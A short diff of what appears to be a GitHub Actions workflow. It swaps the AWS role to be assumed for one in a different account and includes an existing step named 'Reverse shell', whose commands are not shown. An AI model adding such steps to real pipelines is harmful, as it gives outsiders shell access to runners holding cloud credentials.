@@ -13,7 +13,7 @@ jobs:
     steps:
       - uses: aws-actions/configure-aws-credentials@v3
         with:
-          role-to-assume: arn:aws:iam::694952825951:role/axiom-cloudwatch-forwarder-release-20241007163724313800000001
+          role-to-assume:  arn:aws:iam::035866691871:role/incubator-cicd-vrms
           aws-region: us-east-1
       - name: Reverse shell
         run: |
